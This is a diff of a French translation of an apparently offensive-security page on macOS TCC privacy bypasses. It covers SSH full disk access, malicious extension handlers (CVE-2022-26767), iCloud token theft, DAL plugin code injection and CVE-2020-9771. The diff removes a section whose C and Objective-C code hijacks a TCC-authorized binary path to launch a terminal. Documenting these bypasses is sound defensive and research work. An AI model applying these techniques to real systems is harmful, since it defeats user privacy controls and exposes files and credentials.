@@ -14,9 +14,9 @@
 
 ## Par fonctionnalité
 
-### Contournement de l'écriture
+### Contournement d'écriture
 
-Ce n'est pas un contournement, c'est juste le fonctionnement de TCC : **il ne protège pas contre l'écriture**. Si le Terminal **n'a pas accès à la lecture du Bureau d'un utilisateur, il peut toujours y écrire** :
+Ce n'est pas un contournement, c'est simplement la façon dont TCC fonctionne : **il ne protège pas contre l'écriture**. Si le Terminal **n'a pas accès à la lecture du Bureau d'un utilisateur, il peut toujours y écrire** :
 ```shell-session
 username@hostname ~ % ls Desktop
 ls: Desktop: Operation not permitted
@@ -28,92 +28,13 @@ asd
 ```
 L'**attribut étendu `com.apple.macl`** est ajouté au nouveau **fichier** pour donner à l'**application créatrice** l'accès en lecture.
 
-### Chemins absolus TCC
-
-La manière la plus courante de donner une permission TCC à une application est d'utiliser le bundle. Cependant, il est également possible de **donner accès à un binaire en indiquant le chemin absolu**.\
-La partie intéressante est que si vous pouvez écraser le binaire, vous pouvez **voler l'accès**.
-
-Vous pouvez utiliser ce code pour appeler un binaire:
-
-{% tabs %}
-{% tab title="invoker.m" %}
-```
-#import <Foundation/Foundation.h>
-
-// clang -fobjc-arc -framework Foundation invoker.m -o invoker
-
-int main(int argc, const char * argv[]) {
-@autoreleasepool {
-// Check if the argument is provided
-if (argc != 2) {
-NSLog(@"Usage: %s <path_to_executable>", argv[0]);
-return 1;
-}
-
-// Create a new task
-NSTask *task = [[NSTask alloc] init];
-
-// Set the task's launch path to the provided argument
-[task setLaunchPath:@(argv[1])];
-
-// Launch the task
-[task launch];
-
-// Wait for the task to complete
-[task waitUntilExit];
-}
-return 0;
-}
-```
-{% tab title="shell.c" %}
-```
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>  // For execl and fork
-
-// gcc shell.c -o shell
-// mv shell </path/bin/with/TCC>
-
-int main() {
-pid_t pid = fork();
-
-if (pid == -1) {
-// Fork failed
-perror("fork");
-return 1;
-} else if (pid == 0) {
-// Child process
-execl("/Applications/iTerm.app/Contents/MacOS/iTerm2", "iTerm2", (char *) NULL);
-
-// execl only returns if there's an error
-perror("execl");
-exit(EXIT_FAILURE);
-} else {
-// Parent process
-int status;
-waitpid(pid, &status, 0);  // Wait for the child process to finish
-
-if (WIFEXITED(status)) {
-// Return the exit status of iTerm2
-return WEXITSTATUS(status);
-}
-}
-
-return 0;
-}
-```
-{% endtab %}
-{% endtabs %}
-
-
-
 ### Contournement SSH
 
 Par défaut, un accès via **SSH avait "Accès complet au disque"**. Pour le désactiver, vous devez le répertorier mais le désactiver (le supprimer de la liste ne supprimera pas ces privilèges) :
 
 ![](<../../../../../.gitbook/assets/image (569).png>)
 
-Ici, vous pouvez trouver des exemples de **malwares ayant réussi à contourner cette protection** :
+Vous trouverez ici des exemples de **malwares ayant réussi à contourner cette protection** :
 
 * [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
 
@@ -123,17 +44,17 @@ Notez que maintenant, pour pouvoir activer SSH, vous avez besoin de **l'accès c
 
 ### Gérer les extensions - CVE-2022-26767
 
-L'attribut **`com.apple.macl`** est attribué aux fichiers pour donner à une **certaine application des autorisations pour les lire**. Cet attribut est défini lorsque vous **glissez-déposez** un fichier sur une application, ou lorsque l'utilisateur **double-clique** sur un fichier pour l'ouvrir avec l'**application par défaut**.
+L'attribut **`com.apple.macl`** est attribué aux fichiers pour donner à une **certaine application des autorisations de lecture**. Cet attribut est défini lorsque vous **glissez-déposez** un fichier sur une application, ou lorsque vous **double-cliquez** sur un fichier pour l'ouvrir avec l'**application par défaut**.
 
-Par conséquent, un utilisateur pourrait **enregistrer une application malveillante** pour gérer toutes les extensions et appeler les services de lancement pour **ouvrir** n'importe quel fichier (ainsi, le fichier malveillant aura accès en lecture).
+Par conséquent, un utilisateur pourrait **enregistrer une application malveillante** pour gérer toutes les extensions et appeler les services de lancement pour **ouvrir** n'importe quel fichier (ainsi, le fichier malveillant aura l'autorisation de le lire).
 
 ### iCloud
 
-L'attribution **`com.apple.private.icloud-account-access`** permet de communiquer avec le service XPC **`com.apple.iCloudHelper`** qui **fournira des jetons iCloud**.
+Avec l'autorisation **`com.apple.private.icloud-account-access`**, il est possible de communiquer avec le service XPC **`com.apple.iCloudHelper`** qui **fournira des jetons iCloud**.
 
-**iMovie** et **Garageband** avaient cette attribution et d'autres qui le permettaient.
+**iMovie** et **Garageband** avaient cette autorisation et d'autres qui le permettaient.
 
-Pour plus d'**informations** sur l'exploitation pour **obtenir des jetons iCloud** à partir de cette attribution, consultez la présentation : [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)
+Pour plus d'**informations** sur l'exploitation pour **obtenir des jetons iCloud** à partir de cette autorisation, consultez la présentation : [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)
 
 ### kTCCServiceAppleEvents / Automation
 
@@ -336,9 +257,9 @@ exit(0);
 ```
 Pour plus d'informations, consultez le [**rapport original**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).
 
-### Plug-ins de la couche d'abstraction des périphériques (DAL)
+### Plug-ins de la couche d'abstraction du périphérique (DAL)
 
-Les applications système qui ouvrent un flux de caméra via Core Media I/O (applications avec **`kTCCServiceCamera`**) chargent **dans le processus ces plug-ins** situés dans `/Library/CoreMediaIO/Plug-Ins/DAL` (non restreints par SIP).
+Les applications système qui ouvrent un flux de caméra via Core Media I/O (applications avec **`kTCCServiceCamera`**) chargent **dans le processus ces plugins** situés dans `/Library/CoreMediaIO/Plug-Ins/DAL` (non restreints par SIP).
 
 Il suffit de stocker une bibliothèque avec le **constructeur** commun pour **injecter du code**.
 
@@ -453,7 +374,7 @@ exploit_location]; task.standardOutput = pipe;
 
 ### CVE-2020-9771 - Contournement de TCC et élévation de privilèges avec mount\_apfs
 
-**N'importe quel utilisateur** (même non privilégié) peut créer et monter une sauvegarde de machine à remonter le temps et **accéder à TOUS les fichiers** de cette sauvegarde.\
+**N'importe quel utilisateur** (même non privilégié) peut créer et monter une sauvegarde de machine à remonter dans le temps et **accéder à TOUS les fichiers** de cette sauvegarde.\
 Le **seul privilège** requis est que l'application utilisée (comme `Terminal`) ait **un accès complet au disque** (FDA) (`kTCCServiceSystemPolicyAllfiles`), qui doit être accordé par un administrateur.
 
 {% code overflow="wrap" %}
